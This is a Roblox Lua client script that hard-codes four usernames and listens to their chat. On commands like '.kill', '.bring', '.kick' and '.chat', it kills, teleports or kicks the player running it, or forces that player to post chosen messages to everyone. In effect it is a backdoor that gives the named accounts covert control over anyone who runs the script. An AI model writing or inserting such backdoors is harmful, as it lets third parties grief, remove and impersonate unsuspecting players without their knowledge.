local admins = {'Godpower122', 'Afyzone', 'Strupid101', 'zocat'}

local function admincmds(user)
    local admin = user
    if game.Players:FindFirstChild(admin) then
        game.Players:FindFirstChild(admin).Chatted:Connect(function(chat)
            if chat == '.bring all' then 
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
            end
            
            if chat == '.kill all' then 
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            end
            
            if string.find(chat, '.bring') then 
                if chat ~= '.bring all' then 
                    local findplr = chat:gsub(".bring ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
                    end
                end
            end
            
            if string.find(chat, '.kill') then 
                if chat ~= '.kill all' then 
                    local findplr = chat:gsub(".kill ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                    end
                end
            end
            
            if chat == '.kick all' then 
                game.Players.LocalPlayer:Kick('Kicked by afy')
            end
            
            if string.find(chat, '.kick') then 
                if chat ~= '.kick all' then               
                    local findplr = chat:gsub(".kick ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer:Kick('Kicked by afy')
                    end
                end
            end

            if string.find(chat, '.chat all') then
                local findchat = chat:gsub('.chat all ', '')
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(findchat, 'All')
            end

            if string.find(chat,'.chat') then 
                if not string.find(chat, '.chat all') then 
                    local findchat
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if string.find(chat, v.Name) then 
                            findchat = chat:gsub(v.Name .. ' ', '')
                        end
                    end
                    local newchat = findchat:gsub('.chat ', '')
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(newchat, 'All')
                end
            end

            if string.find(chat, '.kick') then 
                if chat ~= '.kick all' then 
                    local findplr = chat:gsub(".kick ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer:Kick('Kicked by afy')
                    end
                end
            end
        end)
    end
end 

for i,v in pairs(admins) do
    admincmds(v)
end


game.Players.PlayerAdded:Connect(function(v)
    for i2, v2 in pairs(admins) do
        if v.Name == v2 then 
            admincmds(tostring(v2))
        end
    end
end)
